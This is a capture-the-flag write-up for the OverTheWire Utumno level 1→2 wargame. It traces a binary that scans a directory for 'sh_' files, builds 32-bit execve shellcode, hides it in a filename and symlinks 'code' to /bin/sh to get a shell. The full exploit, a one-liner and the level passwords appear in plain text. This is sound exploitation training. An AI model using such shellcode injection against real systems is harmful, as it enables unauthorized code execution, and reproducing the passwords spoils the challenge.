---
date: 2023-09-09 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 1 → 2 tutorial!!"
permalink: /posts/Over-The-Wire-Utumno-Level-1-to-2/
tags: [overthewire, utumno, pwn, shellcode, directory-traversal, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 1 → 2!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-0-to-1/' | relative_url }}">← Previous: Level 0 → 1</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno2.html" target="_blank" rel="noopener">Official (Level 2) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Utumno-Level-2-to-3/' | relative_url }}">Next: Level 2 → 3 →</a>
  </div>
</nav>

## Login

Use the password from **Level 0 → 1**:

```bash
ssh utumno1@utumno.labs.overthewire.org -p 2227
# password: aathaeyiew
````

Then go to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno1`**

* The program prints **no output**, with or without arguments.
* Dynamic tracing reveals it **opens a directory** you pass as an argument and **looks for a file whose name starts with `sh_`**.
* The interesting part: with a crafted `sh_...` filename, the program ends up **executing bytes from the filename** (leading to a segfault with long `A`s).
* Goal: craft a filename whose bytes are **valid shellcode**, then leverage it to spawn a shell and read the password for `utumno2`.

---

## Source Code

No source is provided, but dynamic analysis clearly shows the workflow. We’ll use `ltrace` to see high-level libc calls and `gdb` to confirm control flow at the return site:

* `opendir(<arg>)` and repeated `readdir(...)`
* `strncmp("sh_", entry->d_name, 3)` to find candidate names
* A later step uses data derived from the filename in a way that lets us control **execution flow** (EIP).

---

## Exploitation Steps

### 1) Trace the binary to understand behavior

```bash
ltrace ./utumno1 123
# opendir("123") = 0  ; not a directory → exit(1)

mkdir -p /tmp/ax
ltrace ./utumno1 /tmp/ax
# opendir("/tmp/ax") = 0x804a008
# readdir(...)      → ".", then ".."
# strncmp("sh_", ".", 3)  = 69
# strncmp("sh_", "..", 3) = 69
# readdir(...) → 0 (end)
```

Conclusion: it scans the directory and wants entries beginning with `sh_`.

---

### 2) Create a candidate filename and observe the crash

```bash
cd /tmp/ax
touch sh_AAAAAAAAAAAAAAAA
/utumno/utumno1 /tmp/ax
# Segmentation fault  ✅
```

A crash on long input is promising—likely EIP control via the filename bytes.

---

### 3) Confirm control flow with `gdb`

```bash
gdb -q /utumno/utumno1
(gdb) set disassembly-flavor intel
(gdb) disas run
# ... run() ends in a 'ret'

(gdb) break *run+25         # place a bp right before returning
(gdb) run /tmp/ax           # run against our directory

# Breakpoint hits:
(gdb) x/x $esp
# 0xffffd678: 0x0804a032      ← return target pulled from stack
(gdb) x/x 0x0804a032
# 0x804a032: 0x41414141       ← 'A' 'A' 'A' 'A'
```

The return target contains our **filename bytes** (`0x41` = `'A'`). That means the program later **returns into** our controllable buffer—so anything after `sh_` can be **executed as code**.

---

### 4) Plan the payload

We’ll place a **short `execve("./code", NULL, NULL)` shellcode** in the filename (after `sh_`). Then we’ll create a symlink named **`code`** that points to `/bin/sh`. When the program “returns into” our bytes, it runs our shellcode → executes `./code` → spawns `/bin/sh` under the target user.

Minimal assembly (NASM, 32-bit):

```asm
global _start
section .text
_start:
    xor eax, eax
    push eax
    push 0x65646f63     ; "code"
    mov ebx, esp        ; ebx = "./code"
    push eax
    mov edx, esp        ; edx = NULL (envp)
    push ebx
    mov ecx, esp        ; ecx = &("./code"), argv = ["code", NULL]
    mov al, 0xb         ; sys_execve
    int 0x80
```

---

### 5) Build, extract shellcode bytes, and stage the directory

```bash
# assemble & link
nasm -f elf32 shell.asm
ld -m elf_i386 -s -o shell shell.o

# extract shellcode bytes from object
objdump -d ./shell.o | grep '[0-9a-f]:' | grep -v 'file' \
 | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
 | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'

# Example output:
# "\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Create the **filename** embedding shellcode after `sh_`, and create the **symlink**:

```bash
touch sh_$(python -c "print '\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
ln -s /bin/sh /tmp/ax/code
```

---

### 6) Get the shell and read the password

```bash
/utumno/utumno1 `pwd`
$ whoami
utumno2
$ cat /etc/utumno_pass/utumno2
ceewaceiph
```

Boom—code execution via filename-controlled bytes.

---

## Password

From my run:

```
ceewaceiph
```

---

## Quick One-liner

```bash
cd /tmp && mkdir -p ax && cd ax && \
python - <<'PY'
sc = "\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
import os
open("sh_"+sc, "wb").close()
PY
ln -sf /bin/sh code && /utumno/utumno1 `pwd` && whoami && cat /etc/utumno_pass/utumno2
```

---

## Troubleshooting

* **No segfault on `sh_...`?** Ensure you’re passing a **directory path** to the program and that the directory contains a filename **starting with `sh_`** followed by enough bytes.
* **GDB shows no `0x41414141`?** Your `sh_` filename may be too short; make it longer to influence the return target.
* **Shellcode not executing?**

  * Verify you didn’t include bad bytes that get mangled.
  * Make sure `code` symlink exists and points to `/bin/sh`.
  * Consider NOP sled or alignment if your environment differs.
* **Architecture mismatch on build tools?** Use 32-bit flags (`-m32`) and 32-bit NASM target (`-f elf32`). All exploitation here is **32-bit**.

---

**Congrats 🎉** You exploited **return-to-filename shellcode** by abusing how the program processes directory entries—clean and elegant!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
